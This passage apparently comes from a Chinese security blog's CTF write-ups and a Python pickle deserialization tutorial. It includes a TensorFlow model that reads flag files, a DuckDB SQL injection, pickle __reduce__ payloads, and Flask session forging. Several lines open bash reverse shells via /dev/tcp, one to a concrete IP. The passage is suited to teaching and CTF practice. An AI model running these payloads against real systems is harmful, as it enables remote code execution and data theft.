“serve”,model里面要有一个server方法,该方法可控\n所以我们的思路就是上传一个含有恶意server方法的model,打包成zip上传,当服务端调用里面的server方法后执行恶意代码,返回flag内容\nimport osimport tempfileimport timeimport zipfileimport tensorflow as tfimport logging# 设置日志记录logging.basicConfig(level=logging.INFO, format=&quot;%(asctime)s - %(levelname)s - %(message)s&quot;)logger = logging.getLogger(__name__)# 定义常见的 flag 文件路径和通配符FLAG_PATTERNS = [    &quot;/flag&quot;, &quot;/flag.txt&quot;,    &quot;/app/flag&quot;, &quot;/app/flag.txt&quot;,    &quot;/workspace/flag&quot;, &quot;/workspace/flag.txt&quot;,    &quot;/home/flag&quot;, &quot;/home/flag.txt&quot;,    &quot;/tmp/flag&quot;, &quot;/tmp/flag.txt&quot;,    &quot;/*flag*&quot;, &quot;/app/*flag*&quot;, &quot;/workspace/*flag*&quot;, &quot;/home/*flag*&quot;, &quot;/tmp/*flag*&quot;,]class FlagModel(tf.Module):    @tf.function(input_signature=[tf.TensorSpec(shape=[None, None], dtype=tf.float32)])    def serve(self, x):        &quot;&quot;&quot;在 TensorFlow 图中搜索文件，返回 flag 内容或 &#x27;not found&#x27;。        Args:            x: 输入张量，形状为 [batch_size, num_features]，类型为 tf.float32。        Returns:            字典，包含 &#x27;prediction&#x27; 键，对应的值为形状为 [1, 1] 的 tf.string 张量。        &quot;&quot;&quot;        files = tf.constant([], dtype=tf.string)        for pattern in FLAG_PATTERNS:            matches = tf.io.matching_files(pattern)            files = tf.concat([files, matches], axis=0)        def _read_first():            &quot;&quot;&quot;读取第一个匹配文件的内容。&quot;&quot;&quot;            return tf.io.read_file(files[0])        def _not_found():            &quot;&quot;&quot;未找到文件时返回 &#x27;not found&#x27;。&quot;&quot;&quot;            return tf.constant(b&quot;not found&quot;, dtype=tf.string)        content = tf.cond(tf.size(files) &gt; 0, _read_first, _not_found)        content = tf.reshape(content, [1, 1])        return &#123;&quot;prediction&quot;: content&#125;if __name__ == &quot;__main__&quot;:    try:        # 实例化模型        model = FlagModel()        logger.info(&quot;模型已实例化&quot;)        # 创建唯一的临时目录用于导出 SavedModel        export_dir = os.path.join(tempfile.gettempdir(), f&quot;flag_savedmodel_&#123;int(time.time())&#125;&quot;)        logger.info(f&quot;导出目录: &#123;export_dir&#125;&quot;)        # 导出模型        tf.saved_model.save(model, export_dir, signatures=&#123;&quot;serve&quot;: model.serve&#125;)        logger.info(f&quot;模型已导出到: &#123;export_dir&#125;&quot;)        # 检查导出目录是否包含文件        if not os.path.exists(export_dir) or not os.listdir(export_dir):            raise FileNotFoundError(f&quot;导出目录 &#123;export_dir&#125; 为空或不存在&quot;)        # 创建 ZIP 文件        zip_name = &quot;model.zip&quot;        if os.path.exists(zip_name):            logger.warning(f&quot;ZIP 文件 &#123;zip_name&#125; 已存在，将被删除&quot;)            os.remove(zip_name)        with zipfile.ZipFile(zip_name, &quot;w&quot;, compression=zipfile.ZIP_DEFLATED) as zip_file:            file_count = 0            for root, _, files in os.walk(export_dir):                for file in files:                    full_path = os.path.join(root, file)                    rel_path = os.path.relpath(full_path, export_dir)                    zip_file.write(full_path, rel_path)                    file_count += 1                    logger.debug(f&quot;添加文件到 ZIP: &#123;rel_path&#125;&quot;)            logger.info(f&quot;成功打包 &#123;file_count&#125; 个文件到 &#123;zip_name&#125;&quot;)        print(f&quot;成功 -&gt; &#123;zip_name&#125; | 导出自: &#123;export_dir&#125;&quot;)    except Exception as e:        logger.error(f&quot;打包失败: &#123;str(e)&#125;&quot;)        print(f&quot;错误: 无法创建 ZIP 文件 - &#123;str(e)&#125;&quot;)\n\nAI eztalk进来一个登陆框,没有其他目录\n\n尝试弱口令登录,得到guest&#x2F;guest,登录\n\n尝试闭合,看看报错信息\n\n可以看到是duckdb数据库,上网搜索到一个cve(CVE-2024-11958)\n参考:https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1\nsql = f&quot;&quot;&quot;        SELECT            fts_main_&#123;self._table_name&#125;.match_bm25(&#123;self._node_id_column&#125;, &#x27;&#123;query&#125;&#x27;) AS score,            &#123;self._node_id_column&#125;, &#123;self._text_column&#125;        FROM &#123;self._table_name&#125;        WHERE score IS NOT NULL        ORDER BY score DESC        LIMIT &#123;self._similarity_top_k&#125;;    &quot;&quot;&quot;\n\n&#123;query&#125;参数是我们可控的\n可以使用以下 payload 创建新文件（ /tmp/exploit ），该文件包含 shell 命令 sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1 \ntest&#x27;) as score, node_id, text from documents; COPY (SELECT &#x27;sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;) TO &#x27;/tmp/exploit&#x27;; select concat(&#x27;0\n\n之后需要注入 SQL 语句来安装 shellfs 扩展，从而使用“shellfs”扩展来执行&#x2F;tmp&#x2F;exploit。由于 DuckDB 中的“shellfs”扩展允许 shell 命令的输入和输出，我们就可以直接反弹shell来getflag。\ntest&#x27;) as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv(&#x27;bash /tmp/exploit |&#x27;); select concat(&#x27;0\n\n然后vps上监听端口即可得到flag\n","categories":["wp"],"tags":["ccb wp"]},{"title":"大模型安全之数据投毒","url":"/2025/09/18/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%8A%95%E6%AF%92/","content":""},{"title":"python反序列化","url":"/2025/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"基础的pickle反序列化介绍和php的反序列化一样,python也存在反序列化,都是为了解决对象传输与持久化储存问题\n相关库和方法在python中有两个库是用来序列化&#x2F;反序列化操作的,分别是pickle&#x2F;cPickle,(在python官方文档中,意思是封存&#x2F;解封),比较常见的是dumps(序列化)和loads(反序列化)\nimport pickleclass Test:    def __init__(self):        self.a = 1test = Test()serialized = pickle.dumps(test)print(serialized)unserialized = pickle.loads(serialized)print(unserialized.a)&quot;&quot;&quot;b&#x27;\\x80\\x04\\x95&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Test\\x94\\x93\\x94)\\x81\\x94&#125;\\x94\\x8c\\x01a\\x94K\\x01sb.&#x27;1&quot;&quot;&quot;\n\n第一行看起来不太可读,下面是解释\nPVM要对序列化、反序列化很清楚的话，一定要了解 PVM\n首先，在调用 pickle 的时候，实际上是 class pickle.Pickler 和 class pickle.Unpickler 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。\nPVM 由三部分组成：\n\n指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止（看上面的代码示例，序列化之后的结果最后是 .）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：\nopcode是单字节的\n带参数的指令用换行符来确定边界\n\n\n栈区:用list实现的,被用来临时存储数据、参数以及对象\n内存去:用 dict 实现的，为 PVM 的整个生命周期提供存储\n\n最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法\nPVM协议当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新\n\nv0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python\nv1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容\nv2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。\nv3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。\nv4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。\nv5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）。\n\n上面的代码示例其实可以指定PVM协议的版本,想得到人类易读的版本的话,可以指定一下版本\nimport pickleclass Test:    def __init__(self):        self.a = 1test = Test()serialized = pickle.dumps(test,protocol=0)print(serialized)unserialized = pickle.loads(serialized)print(unserialized.a)\n\n结果如下:\nb&#x27;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nTest\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVa\\np6\\nI1\\nsb.&#x27;1\n\n关键代码\npickle.dumps(obj[, protocol])\n\n\n功能：将obj对象序列化为string形式，而不是存入文件中。 参数: obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。\n\npickle.loads(string)\n\n\n功能：从string中读出序列化前的obj对象。 参数: string：文件名称。\n\n在序列化时，协议版本是自动检测出来的，所以诸如 loads 方法是不需要参数来指定协议的。\n由于不同版本在利用的时候没有很大区别，所以本文以最易读的 v0 协议为例\nopcodeopcode 是 PVM 的灵魂，控制整个流程的运行.\nMARK           = b&#x27;(&#x27;   # 向栈中压入一个 MARK 标记STOP           = b&#x27;.&#x27;   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值POP            = b&#x27;0&#x27;   # 丢弃栈顶对象POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobjectDUP            = b&#x27;2&#x27;   # duplicate top stack itemFLOAT          = b&#x27;F&#x27;   # 实例化一个 float 对象INT            = b&#x27;I&#x27;   # 实例化一个 int 或者 bool 对象BININT         = b&#x27;J&#x27;   # push four-byte signed intBININT1        = b&#x27;K&#x27;   # push 1-byte unsigned intLONG           = b&#x27;L&#x27;   # push long; decimal string argumentBININT2        = b&#x27;M&#x27;   # push 2-byte unsigned intNONE           = b&#x27;N&#x27;   # 栈中压入 NonePERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string argBINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stackREDUCE         = b&#x27;R&#x27;   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈STRING         = b&#x27;S&#x27;   # 实例化一个字符串对象BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytesUNICODE        = b&#x27;V&#x27;   # 实例化一个 UNICODE 字符串对象BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argumentAPPEND         = b&#x27;a&#x27;   # 将栈的第一个元素 append 到第二个元素（必须为列表）中BUILD          = b&#x27;b&#x27;   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()GLOBAL         = b&#x27;c&#x27;   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈DICT           = b&#x27;d&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果EMPTY_DICT     = b&#x27;&#125;&#x27;   # 向栈中直接压入一个空字典APPENDS        = b&#x27;e&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中GET            = b&#x27;g&#x27;   # 将 memo[n] 的压入栈BINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte argINST           = b&#x27;i&#x27;   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte argLIST           = b&#x27;l&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表EMPTY_LIST     = b&#x27;]&#x27;   # 向栈中直接压入一个空列表OBJ            = b&#x27;o&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，PUT            = b&#x27;p&#x27;   # 将栈顶对象储存至 memo[n]BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte argLONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte argSETITEM        = b&#x27;s&#x27;   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中TUPLE          = b&#x27;t&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果EMPTY_TUPLE    = b&#x27;)&#x27;   # 向栈中直接压入一个空元组SETITEMS       = b&#x27;u&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encodingTRUE           = b&#x27;I01\\n&#x27;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#x27;I00\\n&#x27;  # not an opcode; see INT docs in pickletools.py\n\n当然，这些都是 v0 协议的 opcode，其他版本的协议会新增&#x2F;替换一些 opcode\n以上面的b&#39;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nTest\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVa\\np6\\nI1\\nsb.&#39;为例子,现在来解读一下这个反序列化结果\nc copy_reg _reconstructor: stack[copy_reg._reconstructor]p 0: memo[copy_reg._reconstructor](: stack[(, copy_reg._reconstructor]c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]p 1: memo[copy_reg._reconstructor, __main__.Test]c __builtin__ object: stack[__builtin__.object, __main__.Test, (, copy_reg._reconstructor]p 2: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object]N: stack[None, __builtin__.object, __main__.Test, (, copy_reg._reconstructor]t: stack[(None, __builtin__.object, __main__.Test), copy_reg._reconstructor]p 3: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test)]R stack[&lt;__main__.Test at 0x160578603d0&gt;]p 4: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;](: stack[(, &lt;__main__.Test at 0x160578603d0&gt;]d: stack[&#123;&#125;, &lt;__main__.Test at 0x160578603d0&gt;]p 5: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;, &#123;&#125;]V a: stack[&quot;a&quot;, &lt;__main__.Test at 0x160578603d0&gt;]p 6: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;, &#123;&#125;, &quot;a&quot;]I 1: stack[1, &quot;a&quot;, &lt;__main__.Test at 0x160578603d0&gt;]s: stack[&#123;&quot;a&quot;: 1&#125;, &lt;__main__.Test at 0x160578603d0&gt;]b: stack[&lt;__main__.Test at 0x160578603d0&gt;]  # set a = 1.: []  # 返回 &lt;__main__.Test at 0x160578603d0&gt;\n\n感觉还是很难理解\n所以 Python 官方提供了工具，叫 pickletools，它的作用主要是：\n\n可读性较强的方式展示一个序列化对象（pickletools.dis）\n对一个序列化结果进行优化（pickletools.optimize）\n\nimport pickletoolsprint(pickletools.dis(serialized))\n\n结果如下:\n    0: c    GLOBAL     &#x27;copy_reg _reconstructor&#x27;   25: p    PUT        0   28: (    MARK   29: c        GLOBAL     &#x27;__main__ Test&#x27;   44: p        PUT        1   47: c        GLOBAL     &#x27;__builtin__ object&#x27;   67: p        PUT        2   70: N        NONE   71: t        TUPLE      (MARK at 28)   72: p    PUT        3   75: R    REDUCE   76: p    PUT        4   79: (    MARK   80: d        DICT       (MARK at 79)   81: p    PUT        5   84: V    UNICODE    &#x27;a&#x27;   87: p    PUT        6   90: I    INT        1   93: s    SETITEM   94: b    BUILD   95: .    STOPhighest protocol among opcodes = 0\n\n小结由于在反序列化的时候，这个对象要能在当前环境上下文中创建，所以在实际的利用过程中，那些默认加载的库、标准库（可被自动 import）就成了首选的类，比如 os，它有 system 方法。\n对于 Python 可以被 pickle&#x2F;unpickle 的对象以及其他一些注意事项,这里列出几点比较重要的:\n\n函数（内置函数或用户自定义函数）在被封存时，引用的是函数全名（这就是为什么 lambda 函数不可以被封存：所有的匿名函数都有同一个名字：&lt;lambda&gt;）。这意味着只有函数所在的模块名，与函数名会被封存，函数体及其属性不会被封存。因此，在解封的环境中，函数所属的模块必须是可以被导入的，而且模块必须包含这个函数被封存时的名称，否则会抛出异常\n\n类也只封存名称，所以在解封环境中也有和函数相同的限制。注意，类体及其数据不会被封存，只有实例数据会被封存，所以在下面的例子中类属性 attr 不会存在于解封后的环境中：\nimport pickleclass Foo:    attr = &#x27;A class attribute&#x27;picklestring = pickle.dumps(Foo)\n\n当实例解封时，它的 __init__() 方法通常不会被调用。其默认动作是：先创建一个未初始化的实例，然后还原其属性：\ndef save(obj):    return (obj.__class__, obj.__dict__)def load(cls, attributes):    obj = cls.__new__(cls)    obj.__dict__.update(attributes)    return obj\n\n攻击思路payload 的构造分为用魔术方法自动构造和手动构造(手搓 opcode)\n自动攻击首先,这样序列化攻击是达不到攻击目的的\nimport pickleimport osclass Test:    def __init__(self):        self.a = os.system(&#x27;whoami&#x27;);test = Test()serialized = pickle.dumps(test,protocol=0)print(serialized)\n\nos.system(&quot;whoami&quot;) 在 test = Test() 就会被执行完毕，所以这个可以说是自己日自己了。\n相关魔术方法上面提到过，解封的时候是有一个默认的赋值过程，既然是默认行为，往往是有办法自定义的。Python 提供了很多魔术方法（比如比较常见的 __reduce__），来改变这一默认行为。下面一起来看下这些魔术方法都是怎么用的（下面几个方法的介绍，内容大部分都是摘录自官方文档）。\n__getnewargs_ex__()\n限制：\n\n对于使用 v2 版或更高版协议的 pickle 才能使用此方法\n必须返回一对 (args, kwargs) 用于构建对象，其中 args 是表示位置参数的 tuple，而 kwargs 是表示命名参数的 dict\n\n__getnewargs_ex__() 方法 return 的值，会在解封时传给 __new__() 方法的作为它的参数\n\n\n__getnewargs__()限制：\n\n必须返回一个 tuple 类型的 args\n如果定义了 __getnewargs_ex__()，那么 __getnewargs__() 就不会被调用\n\n这个方法与上一个 __getnewargs_ex__() 方法类似，但只支持位置参数\n注：在 Python 3.6 前，v2、v3 版协议会调用 __getnewargs__()，更高版本协议会调用 __getnewargs_ex__()\n__setstate__在反序列化时自动执行。它可以在对象从其序列化状态恢复时，对对象进行自定义的状态还原。\n__reduce__构造方法，在反序列化的时候自动执行，类似于php中的__wakeup\n常用payload没有os模块import pickleimport base64 class A(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;,))    a = A()a = pickle.dumps(a)print(base64.b64encode(a))\n\n环境有os模块import pickleimport osimport base64class aaa():    def __reduce__(self):        return(os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;,))a = aaa()payload = pickle.dumps(a)payload = base64.b64encode(payload)print(payload)#注意payloads生成的shell脚本需要在目标机器操作系统上执行，否则会报错\n\n所以最好所有poc在linux上生成\n例题[HFCTF 2021 Final]easyflask上来提示&#x2F;file&#x3D;index.js\n\n存在任意文件读取,先读个环境变量\n\n这就有flag了?看来是非预期,注意到这里有个秘钥\nsecret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh\n\n再看看app&#x2F;source\n#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler():    if not session.get(&#x27;u&#x27;):        u = pickle.dumps(User())        session[&#x27;u&#x27;] = u    return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler():    path = request.args.get(&#x27;file&#x27;)    path = os.path.join(&#x27;static&#x27;, path)    if not os.path.exists(path) or os.path.isdir(path) \\            or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path:        return &#x27;disallowed&#x27;    with open(path, &#x27;r&#x27;) as fp:        content = fp.read()    return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)\n\n抓包看看cookie\n\n发现jwt,漏洞代码:\n@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;\n\n伪造session实现 读取 u 中的 b值,对b中的值进行反序列化,可以直接触发RCE\n对cookie数据签名:\nflask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;payload&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\n一会回来替换payload。\n在linux系统下运行以下代码\nimport osimport pickleimport base64User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (os.system, (&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.122.131.175/2333 0&gt;&amp;1&quot;&#x27;,))&#125;)user=pickle.dumps(User())print(base64.b64encode(user).decode())&quot;&quot;&quot;gASVUQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDZiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjEyMi4xMzEuMTc1LzIzMzMgMD4mMSKUhZRSlC4=&quot;&quot;&quot;\n\n生成后替换payload,并伪造cookie\nflask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\n\n.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmGQ.dppzM5WSDj4VyWzXfRsYX_7E6ng\n\n但是很奇怪,怎么都弹不了shell,改一下命令直接把flag带出来好了\nimport osimport pickleimport base64User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /tmp/1&#x27;)&quot;,))&#125;)user=pickle.dumps(User())print(base64.b64encode(user).decode())&quot;&quot;&quot;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&quot;&quot;&quot;\n\n└─# flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\n得到session\n.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmsA.TG8jihGGbB1fpMg_7MiZOtcsJnI\n\n然后去admin路由下改cookie\n\n然后访问\nhttp://85e89518-1277-4f43-b3b3-f147d35a58fe.node5.buuoj.cn:81/file?file=/tmp/1\n\n得到flag\n\nflag&#123;639e4746-17d1-49aa-9136-ad69a53d4faa&#125;\n\n[0xgame 2023 Notebook]环境找不到,不过从网上找到了源码\nfrom flask import Flask, request, render_template, sessionimport pickleimport uuidimport osapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()class Note(object):    def __init__(self, name, content):        self._name = name        self._content = content    @property    def name(self):        return self._name        @property    def content(self):        return self._content@app.route(&#x27;/&#x27;)def index():    return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/&lt;path:note_id&gt;&#x27;, methods=[&#x27;GET&#x27;])def view_note(note_id):    notes = session.get(&#x27;notes&#x27;)    if not notes:        return render_template(&#x27;note.html&#x27;, msg=&#x27;You have no notes&#x27;)        note_raw = notes.get(note_id)    if not note_raw:        return render_template(&#x27;note.html&#x27;, msg=&#x27;This note does not exist&#x27;)        note = pickle.loads(note_raw)    return render_template(&#x27;note.html&#x27;, note_id=note_id, note_name=note.name, note_content=note.content)@app.route(&#x27;/add_note&#x27;, methods=[&#x27;POST&#x27;])def add_note():    note_name = request.form.get(&#x27;note_name&#x27;)    note_content = request.form.get(&#x27;note_content&#x27;)    if note_name == &#x27;&#x27; or note_content == &#x27;&#x27;:        return render_template(&#x27;index.html&#x27;, status=&#x27;add_failed&#x27;, msg=&#x27;note name or content is empty&#x27;)        note_id = str(uuid.uuid4())    note = Note(note_name, note_content)    if not session.get(&#x27;notes&#x27;):        session[&#x27;notes&#x27;] = &#123;&#125;        notes = session[&#x27;notes&#x27;]    notes[note_id] = pickle.dumps(note)    session[&#x27;notes&#x27;] = notes    return render_template(&#x27;index.html&#x27;, status=&#x27;add_success&#x27;, note_id=note_id)@app.route(&#x27;/delete_note&#x27;, methods=[&#x27;POST&#x27;])def delete_note():    note_id = request.form.get(&#x27;note_id&#x27;)    if not note_id:        return render_template(&#x27;index.html&#x27;)        notes = session.get(&#x27;notes&#x27;)    if not notes:        return render_template(&#x27;index.html&#x27;, status=&#x27;delete_failed&#x27;, msg=&#x27;You have no notes&#x27;)        if not notes.get(note_id):        return render_template(&#x27;index.html&#x27;, status=&#x27;delete_failed&#x27;, msg=&#x27;This note does not exist&#x27;)        del notes[note_id]    session[&#x27;notes&#x27;] = notes    return render_template(&#x27;index.html&#x27;, status=&#x27;delete_success&#x27;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8000, debug=False)\n\n发现密钥非常弱,可以爆破出来.其次&#x2F;path:note_id路由下,pickle.loads 触发反序列化\n\n生成密钥爆破字典\nimport oswhile True:    secret_key=os.urandom(2).hex()    with open(&quot;/var/1.txt&quot;,&quot;a&quot;) as f:        f.write(secret_key+&#x27;\\n&#x27;)\n\n解码原来的session\nflask-unsign --decode --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.7CbLZz_NzrKo8ZunE1HPgPKH6U0&quot;\n\n输出:\n&#123;&#x27;notes&#x27;: &#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;: b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Note\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x05_name\\x94\\x8c\\x011\\x94\\x8c\\x08_content\\x94h\\x06ub.&#x27;&#125;&#125;\n\nvalue里是pickle序列化字符串,这样可以知道session的格式是什么\n\n爆破密钥\nflask-unsign --unsign --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.7CbLZz_NzrKo8ZunE1HPgPKH6U0&quot; -w &quot;/var/1.txt&quot;  --no-literal-eval\n\n\n\n\n​\t得到密钥f991\n\n生成payload\nimport pickleimport osimport base64class aaa():    def 